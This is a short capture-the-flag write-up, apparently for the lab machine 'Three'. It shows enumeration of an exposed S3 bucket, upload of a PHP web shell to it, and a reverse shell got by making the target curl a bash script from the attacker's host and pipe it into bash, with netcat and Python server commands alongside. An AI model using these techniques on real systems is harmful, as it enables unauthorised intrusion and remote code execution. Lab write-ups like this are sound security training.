# Three

## Enumeration 

![](../Images/Pasted%20image%2020240527183432.png)

from the above results we can see there is a web page open and in that page we see a listing for an email: 

![](../Images/Pasted%20image%2020240527183544.png)

lets add the email to our hosts file: 

![](../Images/Pasted%20image%2020240527183626.png)

we get a 404 if we enumerate vhosts for `*.thetoppers.htb` and look for `s3`, lets add that to the vhosts as well: 

![](../Images/Pasted%20image%2020240527184432.png)

now we can see the response when we visit the url: 

![](../Images/Pasted%20image%2020240527184450.png)

using the `awscli` package for linux we can interact with this and look for all the buckets hosted by the server: 

```
aws --endpoint=http://s3.thetoppers.htb s3 ls
```

we can also do the same to look for objects and common prefixes under the specified bucket: 

![](../Images/Pasted%20image%2020240527184740.png)

aws also lets you upload files to this bucket, so lets first create a PHP web shell: 

![](../Images/Pasted%20image%2020240527184855.png)

using `cp` we can upload our shell to the discovered bucket: 

![](../Images/Pasted%20image%2020240527184946.png)

then we can navigate to our uploaded shell and run our commands: 

![](../Images/Pasted%20image%2020240527185024.png)

to instead create a reverse shell we can create a bash shell: 

![](../Images/Pasted%20image%2020240527185222.png)

then start a netcat listener on the specified port with `nc -nlvp 1337`, and start a python server with `python -m http.server 8000`

with this setup we can then use the LFI vulnerable parameter to call a `curl` command to our hosted bash shell: 

```
http://thetoppers.htb/shell.php?cmd=curl%2010.10.15.92:8000/shell.sh|bash
```

![](../Images/Pasted%20image%2020240527191945.png)

